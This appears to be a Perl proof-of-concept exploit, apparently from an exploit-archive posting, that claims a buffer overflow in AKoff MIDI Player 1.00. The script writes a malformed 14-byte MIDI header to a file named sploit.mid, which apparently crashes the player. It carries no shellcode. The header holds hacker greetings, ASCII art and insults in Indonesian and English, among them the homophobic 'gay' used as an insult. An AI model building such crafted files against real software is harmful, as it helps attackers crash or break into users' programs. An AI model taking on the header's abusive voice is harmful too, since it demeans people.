#!/usr/bin/perl

# AKoff MIDI Player 1.00 Buffer Overflow Exploit
# By cr4wl3r <cr4wl3r\x40linuxmail\x2Eorg>
# gr33tz: str0ke, opt!x hacker, xoron, EA ngel, zvtral, Hmei7, mywisdom, cyberlog, irvian, and all my friend
# thanks: milw0rm, darkc0de, exploit-db, inj3ct0r, manadocoding, sekuritionline
# Fuck to buat loe tukang show off, dan buat loe yang mengaku dirinya hacker dan pamer sana-sini
# mengatakan orang lain lamer karena suka deface sedangkan dirinya adalah tukang deface
# you are 1337 lamer 1337 hoax and 1337 gay
# i'm injector and rooter in the site and i'm be silent

#`````````` ___ ____ ____
#````______/```\__//```\__/____\
#``_/```\_/``:```````````//____\
#`/|``````:``:``..``````/````````\    W A R N I N G !!! REMEMBER ME
#|`|`````::`````::``````\````````/
#|`|`````:|`````||`````\`\______/
#|`|`````||`````||``````|\``/``|
#`\|`````||`````||``````|```/`|`\
#``|`````||`````||``````|``/`/_\`\
#``|`___`||`___`||``````|`/``/````\
#```\_-_/``\_-_/`|`____`|/__/``````\
#````````````````_\_--_/````\`````/
#```````````````/____```````````/
#``````````````/`````\`````````/
#``````````````\______\_______/


$buff = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00";
###################################################################
open(file, "> sploit.mid");
print (file $buff);
###################################################################